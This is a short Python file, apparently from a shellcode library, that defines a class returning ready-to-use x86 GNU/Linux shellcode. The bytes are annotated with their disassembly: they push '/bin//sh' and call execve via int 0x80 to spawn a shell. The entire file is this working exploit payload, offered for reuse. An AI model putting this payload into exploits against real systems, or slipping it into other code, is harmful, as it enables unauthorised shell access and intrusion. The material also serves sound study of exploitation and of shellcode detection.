#####################################################################################################
# title         : x86_linux_exec-basic-sh
# description   : Shellcode for x86 GNU/Linux systems that run /bin/sh with current user's rigths
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#####################################################################################################
class Shellcode:
    
    @staticmethod
    def get():
        return Shellcode.shellcode

    shellcode = (
        "\x31\xc0"               # 0x00000000:     xor eax,eax
        "\x50"                   # 0x00000002:     push eax
        "\x68\x2f\x2f\x73\x68"   # 0x00000003:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000008:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x0000000D:     mov ebx,esp
        "\x31\xc9"               # 0x0000000F:     xor ecx,ecx
        "\x89\xca"               # 0x00000011:     mov edx,ecx
        "\x6a\x0b"               # 0x00000013:     push byte +0xb
        "\x58"                   # 0x00000015:     pop eax
        "\xcd\x80"               # 0x00000016:     int 0x80 ; execve()
    ) 
